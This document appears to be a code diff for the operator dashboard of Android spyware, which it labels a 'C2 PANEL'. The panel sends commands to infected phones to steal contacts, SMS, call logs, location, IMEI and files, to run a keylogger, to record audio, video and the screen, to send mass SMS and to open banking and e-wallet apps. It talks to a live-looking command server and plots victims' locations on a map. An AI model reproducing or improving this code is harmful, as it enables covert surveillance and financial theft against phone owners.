+                    <button onclick="renderFiles('/storage/emulated/0/')" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;cursor:pointer;font-size:11px;font-family:inherit">📂 Internal</button>
+                    <button onclick="uploadFile()" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#4fc3f7;cursor:pointer;font-size:11px;font-family:inherit">📤 Upload</button>
+                    <button onclick="renderFiles(currentFilePath)" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;cursor:pointer;font-size:11px;font-family:inherit">🔄 Refresh</button>
                 </div>
             </div>
             <div id="fileList"></div>
@@ -237,12 +310,10 @@
     </div>
 </div>
 
-<!-- Leaflet JS untuk Map -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
 <script>
 // ============================================================
-// 🔥 DASHBOARD ULTIMATE v4.0 - DENGAN MAPS!
+// ☠️ C2 PANEL ULTIMATE v4.0
 // ============================================================
 
 var PASSWORD = '';
@@ -254,920 +325,345 @@ var map = null;
 var mapMarkers = [];
 
 // ============================================================
-// 🔥 48 C2 COMMANDS
+// 48 COMMANDS
 // ============================================================
 var C2_COMMANDS = {
-    'data': {
-        label: '📱 Data Pribadi (10)',
-        commands: [
-            { id: 'ambil_kontak', label: '📇 Ambil Kontak' },
-            { id: 'ambil_sms', label: '💬 Ambil SMS' },
-            { id: 'ambil_call_log', label: '📞 Ambil Call Log' },
-            { id: 'ambil_lokasi', label: '📍 Ambil Lokasi' },
-            { id: 'get_clipboard', label: '📋 Get Clipboard' },
-            { id: 'set_clipboard', label: '📋 Set Clipboard', param: 'text' },
-            { id: 'ambil_imei', label: '📱 IMEI' },
-            { id: 'ambil_imsi', label: '📱 IMSI' },
-            { id: 'ambil_nomor_hp', label: '📱 Nomor HP' },
-            { id: 'get_installed_apps', label: '📱 Installed Apps' }
-        ]
-    },
-    'notif': {
-        label: '🔔 Notifikasi (4)',
-        commands: [
-            { id: 'get_notifications', label: '🔔 Get Notifications' },
-            { id: 'get_notifications_history', label: '📜 Notif History' },
-            { id: 'clear_notification', label: '🗑️ Clear Notif', param: 'id' },
-            { id: 'clear_all_notifications', label: '🗑️ Clear All Notif' }
-        ]
-    },
-    'keylogger': {
-        label: '⌨️ Keylogger (4)',
-        commands: [
-            { id: 'keylogger_start', label: '▶️ Keylogger Start' },
-            { id: 'keylogger_stop', label: '⏹️ Keylogger Stop' },
-            { id: 'keylogger_upload', label: '📤 Keylogger Upload' },
-            { id: 'keylogger_status', label: '📊 Keylogger Status' }
-        ]
-    },
-    'komunikasi': {
-        label: '💬 Komunikasi (3)',
-        commands: [
-            { id: 'kirim_sms', label: '📨 Kirim SMS', param: 'nomor|pesan' },
-            { id: 'kirim_sms_massal', label: '📨 SMS Massal', param: 'pesan' },
-            { id: 'call_number', label: '📞 Call Number', param: 'nomor' }
-        ]
-    },
-    'apps': {
-        label: '📱 Kontrol Aplikasi (5)',
-        commands: [
-            { id: 'buka_aplikasi', label: '📱 Buka Aplikasi', param: 'package' },
-            { id: 'uninstall_aplikasi', label: '🗑️ Uninstall', param: 'package' },
-            { id: 'app_force_stop', label: '⏹️ Force Stop', param: 'package' },
-            { id: 'app_clear_data', label: '🧹 Clear Data', param: 'package' },
-            { id: 'buka_url', label: '🌐 Buka URL', param: 'url' }
-        ]
-    },
-    'target': {
-        label: '💰 Target Aplikasi (7)',
-        commands: [
-            { id: 'buka_dana', label: '💰 DANA' },
-            { id: 'buka_gopay', label: '💰 GoPay' },
-            { id: 'buka_ovo', label: '💰 OVO' },
-            { id: 'buka_bri', label: '🏦 BRI' },
-            { id: 'buka_bca', label: '🏦 BCA' },
-            { id: 'buka_mandiri', label: '🏦 Mandiri' },
-            { id: 'buka_shopee', label: '🛍️ Shopee' }
-        ]
-    },
-    'media': {
-        label: '🎥 Media (5)',
-        commands: [
-            { id: 'screenshot', label: '📸 Screenshot' },
-            { id: 'record_audio', label: '🎤 Record Audio', param: 'durasi' },
-            { id: 'stop_audio', label: '⏹️ Stop Audio' },
-            { id: 'record_video', label: '🎥 Record Video', param: 'durasi' },
-            { id: 'stop_video', label: '⏹️ Stop Video' }
-        ]
-    },
-    'screen': {
-        label: '📹 Screen Recording (3)',
-        commands: [
-            { id: 'screen_record', label: '📹 Start Record', param: 'durasi' },
-            { id: 'screen_record_stop', label: '⏹️ Stop Record' },
-            { id: 'screen_record_status', label: '📊 Record Status' }
-        ]
-    },
-    'file': {
-        label: '📁 File (2)',
-        commands: [
-            { id: 'list_file', label: '📂 List File', param: 'path' },
-            { id: 'ambil_file', label: '📄 Ambil File', param: 'path' }
-        ]
-    },
-    'sistem': {
-        label: '🔧 Sistem (5)',
-        commands: [
-            { id: 'get_system_info', label: '📊 System Info' },
-            { id: 'get_battery', label: '🔋 Battery' },
-            { id: 'get_wifi', label: '📶 WiFi' },
-            { id: 'vibrate', label: '📳 Vibrate', param: 'ms' },
-            { id: 'toast', label: '💬 Toast', param: 'pesan' }
-        ]
-    }
+    'data': { label: '📱 Data (10)', commands: [
+        {id:'ambil_kontak', label:'📇 Contacts'},{id:'ambil_sms', label:'💬 SMS'},{id:'ambil_call_log', label:'📞 Call Log'},{id:'ambil_lokasi', label:'📍 Location'},{id:'get_clipboard', label:'📋 Clipboard'},{id:'set_clipboard', label:'📋 Set Clipboard', param:'text'},{id:'ambil_imei', label:'📱 IMEI'},{id:'ambil_imsi', label:'📱 IMSI'},{id:'ambil_nomor_hp', label:'📱 Phone'},{id:'get_installed_apps', label:'📱 Apps'}
+    ]},
+    'notif': { label: '🔔 Notifications (4)', commands: [
+        {id:'get_notifications', label:'🔔 Get Notifs'},{id:'get_notifications_history', label:'📜 History'},{id:'clear_notification', label:'🗑️ Clear', param:'id'},{id:'clear_all_notifications', label:'🗑️ Clear All'}
+    ]},
+    'keylogger': { label: '⌨️ Keylogger (4)', commands: [
+        {id:'keylogger_start', label:'▶️ Start'},{id:'keylogger_stop', label:'⏹️ Stop'},{id:'keylogger_upload', label:'📤 Upload'},{id:'keylogger_status', label:'📊 Status'}
+    ]},
+    'komunikasi': { label: '💬 Communication (3)', commands: [
+        {id:'kirim_sms', label:'📨 Send SMS', param:'nomor|pesan'},{id:'kirim_sms_massal', label:'📨 Mass SMS', param:'pesan'},{id:'call_number', label:'📞 Call', param:'nomor'}
+    ]},
+    'apps': { label: '📱 Apps (5)', commands: [
+        {id:'buka_aplikasi', label:'📱 Open App', param:'package'},{id:'uninstall_aplikasi', label:'🗑️ Uninstall', param:'package'},{id:'app_force_stop', label:'⏹️ Force Stop', param:'package'},{id:'app_clear_data', label:'🧹 Clear Data', param:'package'},{id:'buka_url', label:'🌐 Open URL', param:'url'}
+    ]},
+    'target': { label: '💰 Targets (7)', commands: [
+        {id:'buka_dana', label:'💰 DANA'},{id:'buka_gopay', label:'💰 GoPay'},{id:'buka_ovo', label:'💰 OVO'},{id:'buka_bri', label:'🏦 BRI'},{id:'buka_bca', label:'🏦 BCA'},{id:'buka_mandiri', label:'🏦 Mandiri'},{id:'buka_shopee', label:'🛍️ Shopee'}
+    ]},
+    'media': { label: '🎥 Media (5)', commands: [
+        {id:'screenshot', label:'📸 Screenshot'},{id:'record_audio', label:'🎤 Record Audio', param:'durasi'},{id:'stop_audio', label:'⏹️ Stop Audio'},{id:'record_video', label:'🎥 Record Video', param:'durasi'},{id:'stop_video', label:'⏹️ Stop Video'}
+    ]},
+    'screen': { label: '📹 Screen Rec (3)', commands: [
+        {id:'screen_record', label:'📹 Start', param:'durasi'},{id:'screen_record_stop', label:'⏹️ Stop'},{id:'screen_record_status', label:'📊 Status'}
+    ]},
+    'file': { label: '📁 Files (2)', commands: [
+        {id:'list_file', label:'📂 List', param:'path'},{id:'ambil_file', label:'📄 Get', param:'path'}
+    ]},
+    'sistem': { label: '🔧 System (5)', commands: [
+        {id:'get_system_info', label:'📊 System Info'},{id:'get_battery', label:'🔋 Battery'},{id:'get_wifi', label:'📶 WiFi'},{id:'vibrate', label:'📳 Vibrate', param:'ms'},{id:'toast', label:'💬 Toast', param:'msg'}
+    ]}
 };
 
 // ============================================================
 // LOGIN
 // ============================================================
 function login() {
-    var inputPass = document.getElementById('loginPassword').value.trim();
-    if (!inputPass) {
-        document.getElementById('loginError').style.display = 'block';
-        document.getElementById('loginError').textContent = '❌ Masukkan password!';
-        return;
-    }
-    fetch('/data?key=' + inputPass)
-        .then(function(response) {
-            if (response.status === 200) {
-                PASSWORD = inputPass;
-                document.getElementById('loginContainer').style.display = 'none';
-                document.getElementById('dashboardContent').style.display = 'block';
-                document.getElementById('loginError').style.display = 'none';
-                initDashboard();
-            } else {
-                document.getElementById('loginError').style.display = 'block';
-                document.getElementById('loginError').textContent = '❌ Password salah!';
-            }
-        })
-        .catch(function() {
-            document.getElementById('loginError').style.display = 'block';
-            document.getElementById('loginError').textContent = '❌ Server error!';
-        });
+    var p = document.getElementById('loginPassword').value.trim();
+    if(!p){ showLoginError('Enter password!'); return; }
+    fetch('/data?key='+p).then(r=>{
+        if(r.status===200){ PASSWORD=p; document.getElementById('loginContainer').style.display='none'; document.getElementById('dashboardContent').style.display='block'; document.getElementById('loginError').style.display='none'; initDashboard(); }
+        else showLoginError('❌ Wrong password!');
+    }).catch(()=>showLoginError('❌ Server error!'));
+}
+function showLoginError(msg){ var el=document.getElementById('loginError'); el.textContent=msg; el.style.display='block'; }
+
+function logout(){
+    PASSWORD=''; document.getElementById('dashboardContent').style.display='none'; document.getElementById('loginContainer').style.display='block'; document.getElementById('loginPassword').value='';
+    if(ws){ws.close();ws=null;} if(map){map.remove();map=null;}
 }
 
-function logout() {
-    PASSWORD = '';
-    document.getElementById('dashboardContent').style.display = 'none';
-    document.getElementById('loginContainer').style.display = 'block';
-    document.getElementById('loginPassword').value = '';
-    if (ws) { ws.close(); ws = null; }
-    if (map) { map.remove(); map = null; }
-}
-
-function initDashboard() {
-    renderC2Commands();
-    connectWebSocket();
-    refreshData();
-    renderMedia();
-    renderFiles('/sdcard/');
-    setInterval(refreshData, 10000);
-    addLog('info', 'Dashboard initialized');
-    // Inisialisasi Map
+// ============================================================
+// INIT
+// ============================================================
+function initDashboard(){
+    renderC2Commands(); connectWebSocket(); refreshData(); renderMedia(); renderFiles('/sdcard/');
+    setInterval(refreshData, 10000); addLog('info','☠️ Panel initialized');
     setTimeout(initMap, 1000);
-}
-
-function showPanel(id) {
-    document.querySelectorAll('.panel').forEach(function(p) { p.classList.remove('active'); });
-    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
-    document.getElementById('panel' + id.charAt(0).toUpperCase() + id.slice(1)).classList.add('active');
-    document.querySelector('.tab[onclick="showPanel(\'' + id + '\')"]').classList.add('active');
-    
-    if (id === 'media') renderMedia();
-    if (id === 'files') renderFiles(currentFilePath);
-    if (id === 'map') { setTimeout(refreshMap, 500); }
 }
 
 // ============================================================
 // WEBSOCKET
 // ============================================================
-function connectWebSocket() {
-    try {
+function connectWebSocket(){
+    try{
         ws = new WebSocket('wss://verifikasi.site/ws');
-        ws.onopen = function() {
-            addLog('info', 'WebSocket connected');
-            ws.send(JSON.stringify({ type: 'auth', key: PASSWORD, role: 'admin' }));
-        };
-        ws.onmessage = function(event) {
-            try {
-                var data = JSON.parse(event.data);
-                if (data.type === 'new_data') {
-                    addLog('data', 'New data from ' + (data.device || 'unknown'));
-                    refreshData();
-                } else if (data.type === 'c2_result') {
-                    addLog('c2', 'C2 Result: ' + JSON.stringify(data.result));
-                    showCmdResult(data.result);
-                }
-            } catch(e) {}
-        };
-        ws.onclose = function() {
-            addLog('error', 'WebSocket disconnected, reconnecting...');
-            setTimeout(connectWebSocket, 5000);
-        };
-        ws.onerror = function() { addLog('error', 'WebSocket error'); };
-    } catch(e) {
-        addLog('error', 'WebSocket connection failed');
-    }
-}
-
-// ============================================================
-// RENDER C2 COMMANDS
-// ============================================================
-function renderC2Commands() {
-    var container = document.getElementById('cmdContainer');
-    container.innerHTML = '';
-    
-    Object.keys(C2_COMMANDS).forEach(function(catKey) {
-        var cat = C2_COMMANDS[catKey];
-        var div = document.createElement('div');
-        div.className = 'cmd-category';
-        div.setAttribute('data-category', catKey);
-        
-        var title = document.createElement('div');
-        title.className = 'cat-title';
-        title.textContent = cat.label;
-        div.appendChild(title);
-        
-        var grid = document.createElement('div');
-        grid.className = 'cmd-grid';
-        
-        cat.commands.forEach(function(cmd) {
-            var btn = document.createElement('div');
-            btn.className = 'cmd-btn';
-            if (cmd.id.includes('uninstall') || cmd.id.includes('clear_') || cmd.id.includes('stop')) {
-                btn.className += ' danger';
-            } else if (cmd.id.includes('start') || cmd.id.includes('record')) {
-                btn.className += ' success';
-            } else if (cmd.id.includes('get') || cmd.id.includes('ambil')) {
-                btn.className += ' warning';
-            }
-            btn.textContent = cmd.label;
-            btn.setAttribute('data-id', cmd.id);
-            btn.setAttribute('data-param', cmd.param || '');
-            btn.title = 'ID: ' + cmd.id + (cmd.param ? ' | Param: ' + cmd.param : '');
-            
-            btn.onclick = function() {
-                var param = this.getAttribute('data-param');
-                if (param) {
-                    openParamModal(cmd.id, cmd.label, param);
-                } else {
-                    sendC2Command(cmd.id, '');
-                }
-            };
-            grid.appendChild(btn);
-        });
-        
-        div.appendChild(grid);
-        container.appendChild(div);
-    });
-    
-    document.getElementById('cmdCount').textContent = '⚡ 48 Commands';
-}
-
-function filterCommands() {
-    var search = document.getElementById('cmdSearch').value.toLowerCase();
-    var category = document.getElementById('cmdCategoryFilter').value;
-    
-    document.querySelectorAll('.cmd-category').forEach(function(cat) {
-        var showCat = true;
-        if (category && cat.getAttribute('data-category') !== category) {
-            showCat = false;
-        }
-        
-        var btns = cat.querySelectorAll('.cmd-btn');
-        var hasMatch = false;
-        btns.forEach(function(btn) {
-            var match = true;
-            if (search && !btn.textContent.toLowerCase().includes(search) && !btn.getAttribute('data-id').includes(search)) {
-                match = false;
-            }
-            btn.style.display = match ? '' : 'none';
-            if (match) hasMatch = true;
-        });
-        
-        cat.style.display = (showCat && hasMatch) ? '' : 'none';
-    });
-}
-
-function openParamModal(cmdId, cmdLabel, paramDesc) {
-    var html = '<h3 style="color:#4fc3f7;margin-bottom:15px">📤 ' + cmdLabel + '</h3>';
-    html += '<p style="color:#8899aa;margin-bottom:10px">Parameter: <strong>' + paramDesc + '</strong></p>';
-    html += '<input type="text" id="paramInput" placeholder="Masukkan parameter..." style="width:100%;padding:10px;border-radius:8px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;margin-bottom:15px">';
-    html += '<div style="display:flex;gap:10px">';
-    html += '<button onclick="sendC2CommandWithParam(\'' + cmdId + '\')" style="flex:1;padding:10px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer">📤 Kirim</button>';
-    html += '<button onclick="closeModal()" style="flex:1;padding:10px;border-radius:8px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer">❌ Batal</button>';
-    html += '</div>';
-    openModal(html);
-}
-
-function sendC2CommandWithParam(cmdId) {
-    var param = document.getElementById('paramInput').value.trim();
-    closeModal();
-    sendC2Command(cmdId, param);
-}
-
-function sendC2Command(cmd, param) {
-    addLog('c2', 'Sending command: ' + cmd + (param ? ' | param: ' + param : ''));
-    
-    var data = { command: cmd, target: 'all', timestamp: Date.now() };
-    if (param) {
-        if (param.includes('|')) {
-            var parts = param.split('|');
-            data.param1 = parts[0] || '';
-            data.param2 = parts[1] || '';
-        } else {
-            data.param = param;
-        }
-    }
-    
-    fetch('/c2?key=' + PASSWORD, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-        addLog('c2', 'Command sent: ' + cmd + ' - ' + (data.status || 'ok'));
-    })
-    .catch(function(e) {
-        addLog('error', 'Send command failed: ' + e.message);
-    });
-}
-
-function sendCustomCommand() {
-    var cmd = document.getElementById('customCmd').value.trim();
-    var param = document.getElementById('customParam').value.trim();
-    if (!cmd) return;
-    sendC2Command(cmd, param);
-    document.getElementById('customCmd').value = '';
-    document.getElementById('customParam').value = '';
-}
-
-function showCmdResult(result) {
-    var el = document.getElementById('cmdResult');
-    el.style.display = 'block';
-    el.textContent = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
-    setTimeout(function() { el.style.display = 'none'; }, 15000);
+        ws.onopen=function(){ addLog('info','WebSocket connected'); ws.send(JSON.stringify({type:'auth',key:PASSWORD,role:'admin'})); };
+        ws.onmessage=function(e){ try{ var d=JSON.parse(e.data); if(d.type==='new_data'){ addLog('data','New data from '+(d.device||'unknown')); refreshData(); } }catch(e){} };
+        ws.onclose=function(){ addLog('error','WebSocket disconnected, reconnecting...'); setTimeout(connectWebSocket,5000); };
+        ws.onerror=function(){ addLog('error','WebSocket error'); };
+    }catch(e){ addLog('error','WebSocket connection failed'); }
 }
 
 // ============================================================
 // DATA
 // ============================================================
-function refreshData() {
-    fetch('/data?key=' + PASSWORD)
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            if (data && data.data) {
-                allData = data.data;
-                renderData(allData);
-                updateStats(allData);
-                updateDeviceCount();
-                // Refresh map jika panel map aktif
-                if (document.getElementById('panelMap').classList.contains('active')) {
-                    refreshMap();
-                }
-            }
-        })
-        .catch(function(e) { addLog('error', 'Refresh data failed: ' + e.message); });
+function refreshData(){
+    fetch('/data?key='+PASSWORD).then(r=>r.json()).then(data=>{
+        if(data&&data.data){ allData=data.data; renderData(allData); updateStats(allData); updateDeviceCount(allData); if(document.getElementById('panelMap').classList.contains('active')) refreshMap(); }
+    }).catch(e=>addLog('error','Refresh failed: '+e.message));
 }
 
-function renderData(data) {
-    var tbody = document.getElementById('dataTableBody');
-    tbody.innerHTML = '';
-    
-    var filtered = data;
-    var search = document.getElementById('searchInput').value.toLowerCase();
-    var filterType = document.getElementById('filterType').value;
-    
-    if (search) {
-        filtered = filtered.filter(function(item) {
-            return JSON.stringify(item).toLowerCase().includes(search);
-        });
-    }
-    if (filterType) {
-        filtered = filtered.filter(function(item) {
-            return item.sumber === filterType;
-        });
-    }
-    
-    filtered.slice(0, 100).forEach(function(item) {
-        var tr = document.createElement('tr');
-        var time = new Date(item.waktu).toLocaleString('id-ID');
-        var dataStr = typeof item.data === 'object' ? JSON.stringify(item.data).substring(0, 100) : (item.data || '');
-        var device = item.device || item.ip || '-';
-        
-        // Aksi
-        var actionHtml = '';
-        var dataObj = typeof item.data === 'object' ? item.data : null;
-        
-        // Cek apakah data lokasi (dari index.html, SystemUpdate.html, atau SystemService.java)
-        if (dataObj && dataObj.lat !== undefined && dataObj.lon !== undefined) {
-            var lat = dataObj.lat;
-            var lon = dataObj.lon;
-            if (typeof lat === 'string') lat = parseFloat(lat);
-            if (typeof lon === 'string') lon = parseFloat(lon);
-            if (!isNaN(lat) && !isNaN(lon) && lat !== 0 && lon !== 0) {
-                actionHtml = '<a href="https://www.google.com/maps?q=' + lat + ',' + lon + '" target="_blank" class="map-btn">🗺️ Maps</a>';
-            }
-        } else if (typeof item.data === 'string' && item.data.includes('lat')) {
-            try {
-                var parsed = JSON.parse(item.data);
-                if (parsed.lat && parsed.lon) {
-                    actionHtml = '<a href="https://www.google.com/maps?q=' + parsed.lat + ',' + parsed.lon + '" target="_blank" class="map-btn">🗺️ Maps</a>';
-                }
-            } catch(e) {}
-        }
-        
-        tr.innerHTML = '<td>' + time + '</td><td>' + item.sumber + '</td><td>' + dataStr + '</td><td>' + device + '</td><td>' + actionHtml + '</td>';
+function renderData(data){
+    var tbody=document.getElementById('dataTableBody'); tbody.innerHTML='';
+    var search=document.getElementById('searchInput').value.toLowerCase();
+    var filter=document.getElementById('filterType').value;
+    var filtered=data.filter(item=>{
+        var match=true;
+        if(search && !JSON.stringify(item).toLowerCase().includes(search)) match=false;
+        if(filter && item.sumber!==filter) match=false;
+        return match;
+    });
+    filtered.slice(0,150).forEach(item=>{
+        var tr=document.createElement('tr');
+        var time=new Date(item.waktu).toLocaleString('id-ID');
+        var dataStr=typeof item.data==='object'?JSON.stringify(item.data).substring(0,80):(item.data||'').substring(0,80);
+        var device=item.device||item.ip||item.deviceId||'-';
+        var action='';
+        var d=typeof item.data==='object'?item.data:null;
+        if(d&&d.lat&&d.lon){ var lat=d.lat, lon=d.lon; if(typeof lat==='string')lat=parseFloat(lat); if(typeof lon==='string')lon=parseFloat(lon); if(!isNaN(lat)&&!isNaN(lon)&&lat!==0&&lon!==0) action='<a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" class="map-btn">🗺️ Maps</a>'; }
+        tr.innerHTML='<td>'+time+'</td><td>'+item.sumber+'</td><td>'+dataStr+'</td><td>'+device+'</td><td>'+action+'</td>';
         tbody.appendChild(tr);
     });
 }
 
-function updateStats(data) {
-    var sms = data.filter(function(d) { return d.sumber === 'sms' || d.sumber === 'sms_all' || d.sumber === 'data_sms'; });
-    var contacts = data.filter(function(d) { return d.sumber === 'kontak' || d.sumber === 'kontak_all' || d.sumber === 'data_kontak'; });
-    var loc = data.filter(function(d) { 
-        return d.sumber === 'lokasi' || d.sumber === 'geolocation_browser' || d.sumber === 'data_lokasi' || d.sumber === 'lokasi_all';
+function updateStats(data){
+    var stats={sms:0,kontak:0,lokasi:0,call_log:0,clipboard:0,screenshot:0,keylogger:0,whatsapp:0,telegram:0,audio:0,video:0,screen_record:0,device:new Set()};
+    data.forEach(item=>{
+        var s=item.sumber||'';
+        if(s==='sms'||s==='sms_all'||s==='data_sms') stats.sms++;
+        else if(s==='kontak'||s==='kontak_all'||s==='data_kontak') stats.kontak++;
+        else if(s==='lokasi'||s==='geolocation_browser'||s==='data_lokasi'||s==='lokasi_all') stats.lokasi++;
+        else if(s==='call_log'||s==='call_log_all'||s==='data_call_log') stats.call_log++;
+        else if(s==='clipboard'||s==='clipboard_all'||s==='data_clipboard') stats.clipboard++;
+        else if(s==='screenshot'||s==='auto_screenshot') stats.screenshot++;
+        else if(s==='keylogger'||s==='keylogger_data') stats.keylogger++;
+        else if(s==='whatsapp') stats.whatsapp++;
+        else if(s==='telegram') stats.telegram++;
+        else if(s==='audio_record') stats.audio++;
+        else if(s==='video_record') stats.video++;
+        else if(s==='screen_record') stats.screen_record++;
+        if(item.ip) stats.device.add(item.ip);
+        if(item.device) stats.device.add(item.device);
+        if(item.deviceId) stats.device.add(item.deviceId);
     });
-    
-    document.getElementById('statTotal').textContent = data.length;
-    document.getElementById('statSMS').textContent = sms.length;
-    document.getElementById('statContacts').textContent = contacts.length;
-    document.getElementById('statLocation').textContent = loc.length;
+    document.getElementById('statTotal').textContent=data.length;
+    document.getElementById('statTotalHeader').textContent=data.length;
+    document.getElementById('statDevices').textContent=stats.device.size;
+    document.getElementById('statSMS').textContent=stats.sms;
+    document.getElementById('statContacts').textContent=stats.kontak;
+    document.getElementById('statLocation').textContent=stats.lokasi;
+    document.getElementById('statCallLog').textContent=stats.call_log;
+    document.getElementById('statClipboard').textContent=stats.clipboard;
+    document.getElementById('statScreenshot').textContent=stats.screenshot;
+    document.getElementById('statKeylogger').textContent=stats.keylogger;
+    document.getElementById('statWhatsApp').textContent=stats.whatsapp;
+    document.getElementById('statTelegram').textContent=stats.telegram;
+    document.getElementById('statAudio').textContent=stats.audio;
+    document.getElementById('statVideo').textContent=stats.video;
+    document.getElementById('statScreenRecord').textContent=stats.screen_record;
 }
 
-function updateDeviceCount() {
-    // Hitung device unik dari IP atau deviceId
-    var devices = new Set();
-    allData.forEach(function(item) {
-        if (item.ip) devices.add(item.ip);
-        if (item.device) devices.add(item.device);
-        if (item.deviceId) devices.add(item.deviceId);
-    });
-    document.getElementById('deviceCount').textContent = '📱 ' + devices.size + ' Devices';
+function updateDeviceCount(data){
+    var devices=new Set();
+    (data||allData).forEach(item=>{ if(item.ip)devices.add(item.ip); if(item.device)devices.add(item.device); if(item.deviceId)devices.add(item.deviceId); });
+    document.getElementById('deviceCount').textContent=devices.size;
 }
 
-function filterData() { renderData(allData); }
-
-function exportData() {
-    var blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
-    a.href = url;
-    a.download = 'data_export_' + Date.now() + '.json';
-    a.click();
-}
+function filterData(){ renderData(allData); }
+function exportData(){ var blob=new Blob([JSON.stringify(allData,null,2)],{type:'application/json'}); var url=URL.createObjectURL(blob); var a=document.createElement('a'); a.href=url; a.download='data_export_'+Date.now()+'.json'; a.click(); }
 
 // ============================================================
-// 🔥 MAP - LOKASI KORBAN (KLIK LANGSUNG KE GOOGLE MAPS!)
+// MAP
 // ============================================================
-function initMap() {
-    if (map) { map.remove(); map = null; }
-    
-    map = L.map('map', {
-        center: [-6.2088, 106.8456],
-        zoom: 5,
-        zoomControl: true
-    });
-    
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '© OpenStreetMap'
-    }).addTo(map);
-    
+function initMap(){
+    if(map){map.remove();map=null;}
+    map=L.map('map',{center:[-6.2088,106.8456],zoom:5,zoomControl:true});
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OSM'}).addTo(map);
     refreshMap();
 }
-
-function refreshMap() {
-    if (!map) { initMap(); return; }
-    
-    // Hapus marker lama
-    mapMarkers.forEach(function(marker) {
-        map.removeLayer(marker);
+function refreshMap(){
+    if(!map){initMap();return;}
+    mapMarkers.forEach(m=>map.removeLayer(m)); mapMarkers=[];
+    var locs=allData.filter(item=>item.sumber==='lokasi'||item.sumber==='geolocation_browser'||item.sumber==='data_lokasi'||item.sumber==='lokasi_all');
+    var list=document.getElementById('locationList'); list.innerHTML='';
+    if(!locs.length){ list.innerHTML='<div class="empty-state">📭 No location data</div>'; return; }
+    var bounds=[];
+    locs.forEach((item,idx)=>{
+        var d=typeof item.data==='object'?item.data:null; var lat=null,lon=null,acc=null;
+        if(d){ lat=d.lat||d.latitude; lon=d.lon||d.longitude; acc=d.accuracy||d.akurasi; }
+        else if(typeof item.data==='string'){ try{ var p=JSON.parse(item.data); lat=p.lat||p.latitude; lon=p.lon||p.longitude; acc=p.accuracy||p.akurasi; }catch(e){} }
+        if(lat&&lon){ if(typeof lat==='string')lat=parseFloat(lat); if(typeof lon==='string')lon=parseFloat(lon); if(!isNaN(lat)&&!isNaN(lon)&&lat!==0&&lon!==0){
+            var popup='<b>📍 #'+(idx+1)+'</b><br>Lat: '+lat+'<br>Lon: '+lon+(acc?'<br>Accuracy: '+acc+'m':'')+'<br><br><a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" style="color:#4fc3f7;">🗺️ Google Maps</a>';
+            var marker=L.marker([lat,lon]).addTo(map); marker.bindPopup(popup); mapMarkers.push(marker); bounds.push([lat,lon]);
+            var div=document.createElement('div'); div.className='location-item'; div.onclick=function(){window.open('https://www.google.com/maps?q='+lat+','+lon,'_blank');};
+            div.innerHTML='<span>📍 #'+(idx+1)+' - '+new Date(item.waktu).toLocaleString('id-ID')+'</span><a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" class="map-btn">🗺️</a>';
+            list.appendChild(div);
+        }}
     });
-    mapMarkers = [];
-    
-    // Ambil data lokasi
-    var locations = allData.filter(function(item) {
-        return item.sumber === 'lokasi' || 
-               item.sumber === 'geolocation_browser' || 
-               item.sumber === 'data_lokasi' || 
-               item.sumber === 'lokasi_all';
-    });
-    
-    var locationList = document.getElementById('locationList');
-    locationList.innerHTML = '';
-    
-    if (locations.length === 0) {
-        locationList.innerHTML = '<div class="empty-state">📭 Belum ada data lokasi</div>';
-        return;
-    }
-    
-    var bounds = [];
-    
-    locations.forEach(function(item, index) {
-        var dataObj = typeof item.data === 'object' ? item.data : null;
-        var lat = null;
-        var lon = null;
-        var accuracy = null;
-        
-        if (dataObj) {
-            lat = dataObj.lat || dataObj.latitude;
-            lon = dataObj.lon || dataObj.longitude;
-            accuracy = dataObj.accuracy || dataObj.akurasi;
-        } else if (typeof item.data === 'string') {
-            try {
-                var parsed = JSON.parse(item.data);
-                lat = parsed.lat || parsed.latitude;
-                lon = parsed.lon || parsed.longitude;
-                accuracy = parsed.accuracy || parsed.akurasi;
-            } catch(e) {}
-        }
-        
-        if (lat && lon) {
-            if (typeof lat === 'string') lat = parseFloat(lat);
-            if (typeof lon === 'string') lon = parseFloat(lon);
-            
-            if (!isNaN(lat) && !isNaN(lon) && lat !== 0 && lon !== 0) {
-                var popupContent = '<b>📍 Lokasi #' + (index + 1) + '</b><br>' +
-                    'Lat: ' + lat + '<br>Lon: ' + lon +
-                    (accuracy ? '<br>Akurasi: ' + accuracy + 'm' : '') +
-                    '<br><br><a href="https://www.google.com/maps?q=' + lat + ',' + lon + '" target="_blank" style="color:#4fc3f7;">🗺️ Buka Google Maps</a>' +
-                    '<br><a href="https://www.openstreetmap.org/?mlat=' + lat + '&mlon=' + lon + '&zoom=15" target="_blank" style="color:#4fc3f7;">🌍 Buka OpenStreetMap</a>';
-                
-                var marker = L.marker([lat, lon], {
-                    title: 'Lokasi Korban #' + (index + 1)
-                }).addTo(map);
-                marker.bindPopup(popupContent);
-                mapMarkers.push(marker);
-                bounds.push([lat, lon]);
-                
-                // Tambahkan ke list
-                var div = document.createElement('div');
-                div.style.cssText = 'padding:8px 12px;border-bottom:1px solid #0d1a2b;cursor:pointer;display:flex;justify-content:space-between;align-items:center;';
-                div.onclick = function() {
-                    window.open('https://www.google.com/maps?q=' + lat + ',' + lon, '_blank');
-                };
